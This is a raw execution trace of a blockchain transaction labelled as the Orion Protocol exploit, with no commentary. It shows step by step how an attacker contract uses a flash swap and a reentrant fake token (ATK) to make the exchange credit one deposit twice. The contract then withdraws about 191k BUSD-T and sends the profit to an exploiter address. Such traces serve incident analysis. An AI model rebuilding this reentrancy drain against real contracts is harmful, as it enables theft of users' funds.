"[Sender]0x8379_Exploiter\n0 \n CALL[Receiver] Orion Protocol Exploit Contract.start()\n()\n1 \n STATICCALLPancakeSwap: USDC-BSC-USD 2.token0()\n(BUSD-T Stablecoin)\n1 \n STATICCALLPancakeSwap: USDC-BSC-USD 2.token1()\n(USD Coin: USDC Token)\n1 \n STATICCALLBUSD-T Stablecoin.allowance(owner=[Receiver]Orion Protocol Exploit Contract, spender=AdminUpgradeabilityProxy_e9d1_17ca)\n(0)\n1 \n CALLBUSD-T Stablecoin.approve(spender=AdminUpgradeabilityProxy_e9d1_17ca, amount=(long param))\n(true)\n2 \n EVENTBUSD-T Stablecoin.Approval(owner=[Receiver]Orion Protocol Exploit Contract, spender=AdminUpgradeabilityProxy_e9d1_17ca, value=(long param))\n1 \n STATICCALLUSD Coin: USDC Token.allowance(owner=[Receiver]Orion Protocol Exploit Contract, spender=AdminUpgradeabilityProxy_e9d1_17ca)\n(0)\n2 \n DELEGATECALLUSD Coin (USDC).allowance(owner=[Receiver]Orion Protocol Exploit Contract, spender=AdminUpgradeabilityProxy_e9d1_17ca)\n(0)\n1 \n CALLUSD Coin: USDC Token.approve(spender=AdminUpgradeabilityProxy_e9d1_17ca, amount=(long param))\n(true)\n2 \n DELEGATECALLUSD Coin (USDC).approve(spender=AdminUpgradeabilityProxy_e9d1_17ca, amount=(long param))\n(true)\n3 \n EVENTUSD Coin: USDC Token.Approval(owner=[Receiver]Orion Protocol Exploit Contract, spender=AdminUpgradeabilityProxy_e9d1_17ca, value=(long param))\n1 \n STATICCALLUSD Coin: USDC Token.allowance(owner=[Receiver]Orion Protocol Exploit Contract, spender=0x129b_OrionPool V2 (UNI-V2))\n(0)\n2 \n DELEGATECALLUSD Coin (USDC).allowance(owner=[Receiver]Orion Protocol Exploit Contract, spender=0x129b_OrionPool V2 (UNI-V2))\n(0)\n1 \n CALLUSD Coin: USDC Token.approve(spender=0x129b_OrionPool V2 (UNI-V2), amount=(long param))\n(true)\n2 \n DELEGATECALLUSD Coin (USDC).approve(spender=0x129b_OrionPool V2 (UNI-V2), amount=(long param))\n(true)\n3 \n EVENTUSD Coin: USDC Token.Approval(owner=[Receiver]Orion Protocol Exploit Contract, spender=0x129b_OrionPool V2 (UNI-V2), value=(long param))\n1 \n CALLAdminUpgradeabilityProxy_e9d1_17ca.depositAsset(assetAddress=USD Coin: USDC Token, amount=500,000,000,000,000,000)\n()\n2 \n DELEGATECALLExchangeWithAtomic.depositAsset(assetAddress=USD Coin: USDC Token, amount=500,000,000,000,000,000)\n()\n3 \n STATICCALLUSD Coin: USDC Token.balanceOf(account=AdminUpgradeabilityProxy_e9d1_17ca)\n(191,606,635,567,219,518,304,670)\n4 \n DELEGATECALLUSD Coin (USDC).balanceOf(account=AdminUpgradeabilityProxy_e9d1_17ca)\n(191,606,635,567,219,518,304,670)\n3 \n CALLUSD Coin: USDC Token.transferFrom(sender=[Receiver]Orion Protocol Exploit Contract, recipient=AdminUpgradeabilityProxy_e9d1_17ca, amount=500,000,000,000,000,000)\n(true)\n4 \n DELEGATECALLUSD Coin (USDC).transferFrom(sender=[Receiver]Orion Protocol Exploit Contract, recipient=AdminUpgradeabilityProxy_e9d1_17ca, amount=500,000,000,000,000,000)\n(true)\n5 \n EVENTUSD Coin: USDC Token.Transfer(from=[Receiver]Orion Protocol Exploit Contract, to=AdminUpgradeabilityProxy_e9d1_17ca, value=500,000,000,000,000,000)\n5 \n EVENTUSD Coin: USDC Token.Approval(owner=[Receiver]Orion Protocol Exploit Contract, spender=AdminUpgradeabilityProxy_e9d1_17ca, value=(long param))\n3 \n STATICCALLUSD Coin: USDC Token.balanceOf(account=AdminUpgradeabilityProxy_e9d1_17ca)\n(191,607,135,567,219,518,304,670)\n4 \n DELEGATECALLUSD Coin (USDC).balanceOf(account=AdminUpgradeabilityProxy_e9d1_17ca)\n(191,607,135,567,219,518,304,670)\n3 \n STATICCALLUSD Coin: USDC Token.decimals()\n(18)\n4 \n DELEGATECALLUSD Coin (USDC).decimals()\n(18)\n3 \n EVENTAdminUpgradeabilityProxy_e9d1_17ca.NewAssetTransaction(user=[Receiver]Orion Protocol Exploit Contract, assetAddress=USD Coin: USDC Token, isDeposit=true, amount=50,000,000, timestamp=1,675,352,420)\n1 \n CALLPancakeSwap: USDC-BSC-USD 2.swap(amount0Out=191,606,635,567,219,518,304,670, amount1Out=0, to=[Receiver]Orion Protocol Exploit Contract, data=(long param))\n()\n2 \n CALLBUSD-T Stablecoin.transfer(recipient=[Receiver]Orion Protocol Exploit Contract, amount=191,606,635,567,219,518,304,670)\n(true)\n3 \n EVENTBUSD-T Stablecoin.Transfer(from=PancakeSwap: USDC-BSC-USD 2, to=[Receiver]Orion Protocol Exploit Contract, value=191,606,635,567,219,518,304,670)\n2 \n CALL[Receiver] Orion Protocol Exploit Contract.pancakeCall(_sender=[Receiver]Orion Protocol Exploit Contract, _amount0=191,606,635,567,219,518,304,670, _amount1=0, _data=(long param))\n()\n3 \n STATICCALLUSD Coin: USDC Token.decimals()\n(18)\n4 \n DELEGATECALLUSD Coin (USDC).decimals()\n(18)\n3 \n CALLAdminUpgradeabilityProxy_e9d1_17ca.swapThroughOrionPool(amount_spend=100,000,000, amount_receive=0, path=[USD Coin: USDC Token, tokenA (ATK), BUSD-T Stablecoin], is_exact_spend=true)\n()\n4 \n DELEGATECALLExchangeWithAtomic.swapThroughOrionPool(amount_spend=100,000,000, amount_receive=0, path=[USD Coin: USDC Token, tokenA (ATK), BUSD-T Stablecoin], is_exact_spend=true)\n()\n5 \n DELEGATECALLLibPool.0x4729ed3c(raw data)\n(raw data)\n6 \n STATICCALLPoolFunctionality.isFactory(a=USD Coin: USDC Token)\n(false)\n6 \n STATICCALLUSD Coin: USDC Token.decimals()\n(18)\n7 \n DELEGATECALLUSD Coin (USDC).decimals()\n(18)\n6 \n STATICCALLUSD Coin: USDC Token.balanceOf(account=[Receiver]Orion Protocol Exploit Contract)\n(500,000,000,000,000,000)\n7 \n DELEGATECALLUSD Coin (USDC).balanceOf(account=[Receiver]Orion Protocol Exploit Contract)\n(500,000,000,000,000,000)\n6 \n STATICCALLUSD Coin: USDC Token.allowance(owner=[Receiver]Orion Protocol Exploit Contract, spender=AdminUpgradeabilityProxy_e9d1_17ca)\n((long param))\n7 \n DELEGATECALLUSD Coin (USDC).allowance(owner=[Receiver]Orion Protocol Exploit Contract, spender=AdminUpgradeabilityProxy_e9d1_17ca)\n((long param))\n6 \n CALLUSD Coin: USDC Token.transferFrom(sender=[Receiver]Orion Protocol Exploit Contract, recipient=AdminUpgradeabilityProxy_e9d1_17ca, amount=500,000,000,000,000,000)\n(true)\n7 \n DELEGATECALLUSD Coin (USDC).transferFrom(sender=[Receiver]Orion Protocol Exploit Contract, recipient=AdminUpgradeabilityProxy_e9d1_17ca, amount=500,000,000,000,000,000)\n(true)\n8 \n EVENTUSD Coin: USDC Token.Transfer(from=[Receiver]Orion Protocol Exploit Contract, to=AdminUpgradeabilityProxy_e9d1_17ca, value=500,000,000,000,000,000)\n8 \n EVENTUSD Coin: USDC Token.Approval(owner=[Receiver]Orion Protocol Exploit Contract, spender=AdminUpgradeabilityProxy_e9d1_17ca, value=(long param))\n6 \n CALLPoolFunctionality.doSwapThroughOrionPool(user=AdminUpgradeabilityProxy_e9d1_17ca, to=AdminUpgradeabilityProxy_e9d1_17ca, swapData=[amount_spend=100,000,000, amount_receive=0, orionpool_router=PoolFunctionality, is_exact_spend=true, supportingFee=false, isInContractTrade=true, isSentETHEnough=false, isFromWallet=true, asset_spend=USD Coin: USDC Token, path=[USD Coin: USDC Token, tokenA (ATK), BUSD-T Stablecoin]])\n(amountOut=100,000,000, amountIn=19,160,683,508,657)\n7 \n STATICCALLUSD Coin: USDC Token.decimals()\n(18)\n8 \n DELEGATECALLUSD Coin (USDC).decimals()\n(18)\n7 \n STATICCALLBUSD-T Stablecoin.decimals()\n(18)\n7 \n STATICCALLOrionPoolV2Factory.getPair(USD Coin: USDC Token, tokenA (ATK))\n(0x8ac6_OrionPool V2 (UNI-V2))\n7 \n STATICCALL0x8ac6_OrionPool V2 (UNI-V2).getReserves()\n(_reserve0=500,000,000,000,000,000, _reserve1=10,000,000,000,000,000,000, _blockTimestampLast=1,675,352,327)\n7 \n STATICCALLOrionPoolV2Factory.getPair(tokenA (ATK), BUSD-T Stablecoin)\n(0x129b_OrionPool V2 (UNI-V2))\n7 \n STATICCALL0x129b_OrionPool V2 (UNI-V2).getReserves()\n(_reserve0=500,000,000,000,000,000, _reserve1=10,000,000,000,000,000,000, _blockTimestampLast=1,675,352,321)\n7 \n STATICCALLOrionPoolV2Factory.getPair(USD Coin: USDC Token, tokenA (ATK))\n(0x8ac6_OrionPool V2 (UNI-V2))\n7 \n CALLAdminUpgradeabilityProxy_e9d1_17ca.safeAutoTransferFrom(token=USD Coin: USDC Token, from=AdminUpgradeabilityProxy_e9d1_17ca, to=0x8ac6_OrionPool V2 (UNI-V2), value=1,000,000,000,000,000,000)\n()\n8 \n DELEGATECALLExchangeWithAtomic.safeAutoTransferFrom(token=USD Coin: USDC Token, from=AdminUpgradeabilityProxy_e9d1_17ca, to=0x8ac6_OrionPool V2 (UNI-V2), value=1,000,000,000,000,000,000)\n()\n9 \n CALLUSD Coin: USDC Token.transfer(recipient=0x8ac6_OrionPool V2 (UNI-V2), amount=1,000,000,000,000,000,000)\n(true)\n10 \n DELEGATECALLUSD Coin (USDC).transfer(recipient=0x8ac6_OrionPool V2 (UNI-V2), amount=1,000,000,000,000,000,000)\n(true)\n11 \n EVENTUSD Coin: USDC Token.Transfer(from=AdminUpgradeabilityProxy_e9d1_17ca, to=0x8ac6_OrionPool V2 (UNI-V2), value=1,000,000,000,000,000,000)\n7 \n STATICCALLBUSD-T Stablecoin.balanceOf(account=AdminUpgradeabilityProxy_e9d1_17ca)\n(1,042,964,306,317,349,367,407,478)\n7 \n STATICCALLOrionPoolV2Factory.getPair(USD Coin: USDC Token, tokenA (ATK))\n(0x8ac6_OrionPool V2 (UNI-V2))\n7 \n STATICCALLOrionPoolV2Factory.getPair(tokenA (ATK), BUSD-T Stablecoin)\n(0x129b_OrionPool V2 (UNI-V2))\n7 \n CALL0x8ac6_OrionPool V2 (UNI-V2).swap(amount0Out=0, amount1Out=6,659,986,639,946,559,786, to=0x129b_OrionPool V2 (UNI-V2), data=\"\")\n()\n8 \n CALLtokenA (ATK).transfer(recipient=0x129b_OrionPool V2 (UNI-V2), amount=6,659,986,639,946,559,786)\n(true)\n9 \n EVENTtokenA (ATK).Transfer(from=0x8ac6_OrionPool V2 (UNI-V2), to=0x129b_OrionPool V2 (UNI-V2), value=6,659,986,639,946,559,786)\n9 \n CALL[Receiver] Orion Protocol Exploit Contract.deposit()\n()\n10 \n STATICCALLBUSD-T Stablecoin.balanceOf(account=[Receiver]Orion Protocol Exploit Contract)\n(191,606,635,567,219,518,304,671)\n10 \n STATICCALL0x000000000000000000636f6e736f6c652e6c6f67.log(description=wh deposit amount, _when=191,606,635,567,219,518,304,671)\n()\n10 \n STATICCALLBUSD-T Stablecoin.balanceOf(account=[Receiver]Orion Protocol Exploit Contract)\n(191,606,635,567,219,518,304,671)\n10 \n CALLAdminUpgradeabilityProxy_e9d1_17ca.depositAsset(assetAddress=BUSD-T Stablecoin, amount=191,606,635,567,219,518,304,671)\n()\n11 \n DELEGATECALLExchangeWithAtomic.depositAsset(assetAddress=BUSD-T Stablecoin, amount=191,606,635,567,219,518,304,671)\n()\n12 \n STATICCALLBUSD-T Stablecoin.balanceOf(account=AdminUpgradeabilityProxy_e9d1_17ca)\n(1,042,964,306,317,349,367,407,478)\n12 \n CALLBUSD-T Stablecoin.transferFrom(sender=[Receiver]Orion Protocol Exploit Contract, recipient=AdminUpgradeabilityProxy_e9d1_17ca, amount=191,606,635,567,219,518,304,671)\n(true)\n13 \n EVENTBUSD-T Stablecoin.Transfer(from=[Receiver]Orion Protocol Exploit Contract, to=AdminUpgradeabilityProxy_e9d1_17ca, value=191,606,635,567,219,518,304,671)\n13 \n EVENTBUSD-T Stablecoin.Approval(owner=[Receiver]Orion Protocol Exploit Contract, spender=AdminUpgradeabilityProxy_e9d1_17ca, value=(long param))\n12 \n STATICCALLBUSD-T Stablecoin.balanceOf(account=AdminUpgradeabilityProxy_e9d1_17ca)\n(1,234,570,941,884,568,885,712,149)\n12 \n STATICCALLBUSD-T Stablecoin.decimals()\n(18)\n12 \n EVENTAdminUpgradeabilityProxy_e9d1_17ca.NewAssetTransaction(user=[Receiver]Orion Protocol Exploit Contract, assetAddress=BUSD-T Stablecoin, isDeposit=true, amount=19,160,663,556,721, timestamp=1,675,352,420)\n10 \n STATICCALLBUSD-T Stablecoin.balanceOf(account=[Receiver]Orion Protocol Exploit Contract)\n(0)\n10 \n STATICCALL0x000000000000000000636f6e736f6c652e6c6f67.log(description=Ed deposit amount, _when=0)\n()\n9 \n STATICCALL0x000000000000000000636f6e736f6c652e6c6f67.log(description=TokenA counter :, _when=3)\n()\n8 \n STATICCALLUSD Coin: USDC Token.balanceOf(account=0x8ac6_OrionPool V2 (UNI-V2))\n(1,500,000,000,000,000,000)\n9 \n DELEGATECALLUSD Coin (USDC).balanceOf(account=0x8ac6_OrionPool V2 (UNI-V2))\n(1,500,000,000,000,000,000)\n8 \n STATICCALLtokenA (ATK).balanceOf(account=0x8ac6_OrionPool V2 (UNI-V2))\n(3,340,013,360,053,440,214)\n8 \n EVENT0x8ac6_OrionPool V2 (UNI-V2).Sync(reserve0=1,500,000,000,000,000,000, reserve1=3,340,013,360,053,440,214)\n8 \n EVENT0x8ac6_OrionPool V2 (UNI-V2).Swap(sender=PoolFunctionality, to=0x129b_OrionPool V2 (UNI-V2), amount0In=1,000,000,000,000,000,000, amount1In=0, amount0Out=0, amount1Out=6,659,986,639,946,559,786)\n7 \n STATICCALLOrionPoolV2Factory.getPair(tokenA (ATK), BUSD-T Stablecoin)\n(0x129b_OrionPool V2 (UNI-V2))\n7 \n CALL0x129b_OrionPool V2 (UNI-V2).swap(amount0Out=199,519,351,395,358,266, amount1Out=0, to=AdminUpgradeabilityProxy_e9d1_17ca, data=\"\")\n()\n8 \n CALLBUSD-T Stablecoin.transfer(recipient=AdminUpgradeabilityProxy_e9d1_17ca, amount=199,519,351,395,358,266)\n(true)\n9 \n EVENTBUSD-T Stablecoin.Transfer(from=0x129b_OrionPool V2 (UNI-V2), to=AdminUpgradeabilityProxy_e9d1_17ca, value=199,519,351,395,358,266)\n8 \n STATICCALLBUSD-T Stablecoin.balanceOf(account=0x129b_OrionPool V2 (UNI-V2))\n(300,480,648,604,641,734)\n8 \n STATICCALLtokenA (ATK).balanceOf(account=0x129b_OrionPool V2 (UNI-V2))\n(16,659,986,639,946,559,786)\n8 \n EVENT0x129b_OrionPool V2 (UNI-V2).Sync(reserve0=300,480,648,604,641,734, reserve1=16,659,986,639,946,559,786)\n8 \n EVENT0x129b_OrionPool V2 (UNI-V2).Swap(sender=PoolFunctionality, to=AdminUpgradeabilityProxy_e9d1_17ca, amount0In=0, amount1In=6,659,986,639,946,559,786, amount0Out=199,519,351,395,358,266, amount1Out=0)\n7 \n STATICCALLBUSD-T Stablecoin.balanceOf(account=AdminUpgradeabilityProxy_e9d1_17ca)\n(1,234,571,141,403,920,281,070,415)\n7 \n EVENTPoolFunctionality.OrionPoolSwap(sender=[Sender]0x8379_Exploiter, st=USD Coin: USDC Token, rt=BUSD-T Stablecoin, st_r=1,000,000,000,000,000,000, st_a=1,000,000,000,000,000,000, rt_r=0, rt_a=191,606,835,086,570,913,662,937, f=OrionPoolV2Factory)\n7 \n STATICCALLUSD Coin: USDC Token.decimals()\n(18)\n8 \n DELEGATECALLUSD Coin (USDC).decimals()\n(18)\n7 \n STATICCALLBUSD-T Stablecoin.decimals()\n(18)\n6 \n STATICCALLBUSD-T Stablecoin.decimals()\n(18)\n6 \n STATICCALLBUSD-T Stablecoin.balanceOf(account=AdminUpgradeabilityProxy_e9d1_17ca)\n(1,234,571,141,403,920,281,070,415)\n6 \n CALLBUSD-T Stablecoin.transfer(recipient=[Receiver]Orion Protocol Exploit Contract, amount=191,606,835,086,570,000,000,000)\n(true)\n7 \n EVENTBUSD-T Stablecoin.Transfer(from=AdminUpgradeabilityProxy_e9d1_17ca, to=[Receiver]Orion Protocol Exploit Contract, value=191,606,835,086,570,000,000,000)\n3 \n STATICCALLBUSD-T Stablecoin.decimals()\n(18)\n3 \n STATICCALLAdminUpgradeabilityProxy_e9d1_17ca.getBalance(assetAddress=BUSD-T Stablecoin, user=[Receiver]Orion Protocol Exploit Contract)\n(19,160,663,556,721)\n4 \n DELEGATECALLExchangeWithAtomic.getBalance(assetAddress=BUSD-T Stablecoin, user=[Receiver]Orion Protocol Exploit Contract)\n(19,160,663,556,721)\n3 \n STATICCALLBUSD-T Stablecoin.balanceOf(account=AdminUpgradeabilityProxy_e9d1_17ca)\n(1,042,964,306,317,350,281,070,415)\n3 \n CALLAdminUpgradeabilityProxy_e9d1_17ca.withdraw(assetAddress=BUSD-T Stablecoin, amount=191,606,635,567,210,000,000,000)\n()\n4 \n DELEGATECALLExchangeWithAtomic.withdraw(assetAddress=BUSD-T Stablecoin, amount=191,606,635,567,210,000,000,000)\n()\n5 \n STATICCALLBUSD-T Stablecoin.decimals()\n(18)\n5 \n CALLBUSD-T Stablecoin.transfer(recipient=[Receiver]Orion Protocol Exploit Contract, amount=191,606,635,567,210,000,000,000)\n(true)\n6 \n EVENTBUSD-T Stablecoin.Transfer(from=AdminUpgradeabilityProxy_e9d1_17ca, to=[Receiver]Orion Protocol Exploit Contract, value=191,606,635,567,210,000,000,000)\n5 \n EVENTAdminUpgradeabilityProxy_e9d1_17ca.NewAssetTransaction(user=[Receiver]Orion Protocol Exploit Contract, assetAddress=BUSD-T Stablecoin, isDeposit=false, amount=19,160,663,556,721, timestamp=1,675,352,420)\n3 \n CALLBUSD-T Stablecoin.transfer(recipient=PancakeSwap: USDC-BSC-USD 2, amount=192,183,185,122,587,280,145,106)\n(true)\n4 \n EVENTBUSD-T Stablecoin.Transfer(from=[Receiver]Orion Protocol Exploit Contract, to=PancakeSwap: USDC-BSC-USD 2, value=192,183,185,122,587,280,145,106)\n2 \n STATICCALLBUSD-T Stablecoin.balanceOf(account=PancakeSwap: USDC-BSC-USD 2)\n(4,122,294,788,042,126,918,837,209)\n2 \n STATICCALLUSD Coin: USDC Token.balanceOf(account=PancakeSwap: USDC-BSC-USD 2)\n(4,121,100,580,946,556,904,012,702)\n3 \n DELEGATECALLUSD Coin (USDC).balanceOf(account=PancakeSwap: USDC-BSC-USD 2)\n(4,121,100,580,946,556,904,012,702)\n2 \n EVENTPancakeSwap: USDC-BSC-USD 2.Sync(reserve0=4,122,294,788,042,126,918,837,209, reserve1=4,121,100,580,946,556,904,012,702)\n2 \n EVENTPancakeSwap: USDC-BSC-USD 2.Swap(sender=[Receiver]Orion Protocol Exploit Contract, to=[Receiver]Orion Protocol Exploit Contract, amount0In=192,183,185,122,587,280,145,106, amount1In=0, amount0Out=191,606,635,567,219,518,304,670, amount1Out=0)\n1 \n STATICCALLBUSD-T Stablecoin.balanceOf(account=[Receiver]Orion Protocol Exploit Contract)\n(191,030,285,531,192,719,854,894)\n1 \n CALLBUSD-T Stablecoin.transfer(recipient=0x3dab_Exploiter, amount=191,030,285,531,192,719,854,894)\n(true)\n2 \n EVENTBUSD-T Stablecoin.Transfer(from=[Receiver]Orion Protocol Exploit Contract, to=0x3dab_Exploiter, value=191,030,285,531,192,719,854,894)\n1 \n STATICCALLBUSD-T Stablecoin.balanceOf(account=0x3dab_Exploiter)\n(191,030,285,531,192,719,854,894)\n1 \n STATICCALL0x000000000000000000636f6e736f6c652e6c6f67.log(description=BUSD of myW:, _when=191,030,285,531,192,719,854,894)\n()\n1 \n STATICCALL0x000000000000000000636f6e736f6c652e6c6f67.log(description=BNB of myW:, _when=100,000,000,000,000,000)\n()\n1 \n SELFDESTRUCT0x3dab_Exploiter.()\n()"